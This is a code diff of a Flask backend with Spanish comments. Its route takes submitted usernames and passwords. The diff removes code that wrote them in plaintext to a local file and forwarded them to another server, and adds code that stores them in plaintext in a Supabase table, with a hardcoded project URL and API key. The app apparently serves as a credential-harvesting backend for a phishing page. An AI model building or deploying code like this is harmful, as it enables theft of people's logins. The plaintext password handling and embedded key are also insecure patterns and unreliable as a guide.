@@ -1,7 +1,18 @@
 from flask import Flask, request, render_template, jsonify
-import requests
+from supabase import create_client, Client
 
 app = Flask(__name__)
+
+# Tu URL y clave de Supabase
+SUPABASE_URL = "https://owoyzrflcazopadcsyvo.supabase.co"  # Sustituye con tu Project URL
+SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93b3l6cmZsY2F6b3BhZGNzeXZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ4OTYwNDUsImV4cCI6MjA1MDQ3MjA0NX0.Sorhymr26eaWHep_bVj2DNklZeKJK9NKRLLhjj3U47E"  # Sustituye con tu API Key
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
 
 @app.route('/save-data', methods=['POST'])
 def save_data():
@@ -9,24 +20,22 @@ def save_data():
     if not data:
         return jsonify({"status": "error", "message": "No data received"}), 400
 
-    try:
-        # Guardar los datos en un archivo local
-        with open('../saved_data.txt', 'a') as file:
-            file.write(f"Username: {data['username']}, Password: {data['password']}\n")
+    username = data.get("username")
+    password = data.get("password")
 
-        # Enviar los datos a otro servidor (si es necesario)
-        # Cambia la URL a la dirección de tu servidor
-        response = requests.post('http://192.168.0.1:5001/save-data', json=data)
-        if response.status_code == 200:
-            return jsonify({"status": "success", "message": "Data saved and sent successfully"})
+    try:
+        # Inserta los datos en la tabla de Supabase
+        response = supabase.table("Brandell").insert(
+            {"username": username, "password": password}
+        ).execute()
+
+        if response.get("status_code") == 200:
+            return jsonify({"status": "success", "message": "Data saved successfully"})
         else:
-            return jsonify({"status": "warning", "message": "Data saved locally but failed to send to server"}), response.status_code
+            return jsonify({"status": "error", "message": response.get("message")}), 500
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route('/')
-def index():
-    return render_template('index.html')
 
 if __name__ == "__main__":
     from waitress import serve
